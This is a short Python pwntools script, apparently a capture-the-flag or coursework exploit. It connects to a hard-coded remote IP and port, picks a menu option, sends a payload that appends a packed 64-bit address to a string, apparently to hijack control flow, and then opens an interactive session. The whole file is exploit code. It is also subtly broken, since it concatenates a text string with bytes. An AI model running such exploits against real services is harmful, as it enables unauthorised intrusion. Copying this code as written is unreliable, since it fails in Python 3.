from pwn import remote
import struct

def main():
    r = remote("107.21.135.41", 3333)
    # r = r.recv()
    # print(r)
    r.recvuntil(b"Please select from menu: ")
    r.sendline(b"1")
    # r.recvuntil(b"ID: ")    
    # r.sendline(b"agoyal61")
    # r.close()
    address = 0x151a
    payload = "0x61/0x61" + struct.pack("<Q", address)    
    r.sendline(payload)

    r.interactive()
if __name__ == "__main__":
	main()        
